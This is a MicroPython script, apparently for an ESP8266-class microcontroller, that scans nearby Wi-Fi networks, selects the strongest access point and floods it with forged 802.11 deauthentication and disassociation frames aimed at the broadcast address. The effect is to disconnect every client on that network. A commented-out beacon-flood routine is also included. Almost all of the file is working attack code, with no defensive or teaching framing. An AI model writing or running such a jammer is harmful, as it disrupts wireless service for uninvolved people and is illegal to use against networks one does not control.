
import network
import time
import uos

sta_if=network.WLAN(0)#0：STA 模式 1：AP模式
sta_if.quitAttack()
sta_if.active(True)
ap_list=sta_if.scan()
#print(ap_list)
ssid=''
bssid=''#bssid:AP MAC address
channel=''#信道
_client=[0xFF,0xFF,0xFF,0xFF,0xFF,0xFF]#默认


# def beacon(ssid, channel, times):
    # packet = bytearray([0x80,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xb8,0xe8,0x56,0x33,0xde,0x01,0xb8,0xe8,0x56,0x33,0xde,0x01,0xc0,0x6c,0x83,0x51,0xf7,0x8f,0x0f,0x00,0x00,0x00,0x64,0x00,0x01,0x04,0x00,0x00])
    # packet[37] = len(ssid)
    # packet.extend(ssid)
    # packet.extend(bytearray([0x01,0x08,0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c,0x03,0x01,0x01]))
    # packet[-1] = channel
    # for i in range(times):
        # packet[10] = packet[16] = uos.urandom(1)[0]
        # packet[11] = packet[17] = uos.urandom(1)[0]
        # packet[12] = packet[18] = uos.urandom(1)[0]
        # packet[13] = packet[19] = uos.urandom(1)[0]
        # packet[14] = packet[20] = uos.urandom(1)[0]
        # packet[15] = packet[21] = uos.urandom(1)[0]
        # sta_if.send_pkt_freedom(channel, packet)
        # time.sleep_ms(10)

def deauth(_ap,_client,type,reason):
    # 0 - 1   type, subtype c0: deauth (a0: disassociate)
    # 2 - 3   duration (SDK takes care of that)
    # 4 - 9   reciever (target)
    # 10 - 15 source (ap)
    # 16 - 21 BSSID (ap)
    # 22 - 23 fragment & squence number
    # 24 - 25 reason code (1 = unspecified reason)
    packet=bytearray([0xC0,0x00,0x00,0x00,0xBB,0xBB,0xBB,0xBB,0xBB,0xBB,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,0x00, 0x00,0x01, 0x00])
    for i in range(0,6):
        packet[4 + i] =_client[i]
        packet[10 + i] = packet[16 + i] =_ap[i]
    #set type
    packet[0] = type;
    packet[24] = reason
    result=sta_if.send_pkt_freedom(packet)
    if result==0:
        time.sleep_ms(1)
        return True
    else:
        return False
    
if __name__=="__main__":
    max_rssid=0
    max_id=0
    num=0
    #获取信号最强的AP 进行攻击
    for i in ap_list:
        if max_rssid==0:
            max_rssid=i[3]#rssid
        else:
            if i[3]>max_rssid:
                max_rssid=i[3]
                max_id=num
        num+=1
    ssid=ap_list[max_id][0]
    bssid=ap_list[max_id][1]
    channel=ap_list[max_id][2]
    print('ssid:',ssid,'-bssid:',bssid)
    print('-channel:',channel,'-rssid:',max_rssid)
    sendNum=1000#攻击次数
    if sta_if.setAttack(channel):
        print('Set Attack OK')
        time.sleep_ms(100)
        print('---deauth runing-----')
        for i in range(0,sendNum):
            r_=deauth(bssid, _client, 0xC0, 0x01)
            if r_:
                
                deauth(bssid, _client, 0xA0, 0x01)
                deauth(_client, bssid, 0xC0, 0x01)
                deauth(_client, bssid, 0xA0, 0x01)
                time.sleep_ms(5)
            else:
                print('---deauth fail-------')
            time.sleep_ms(1)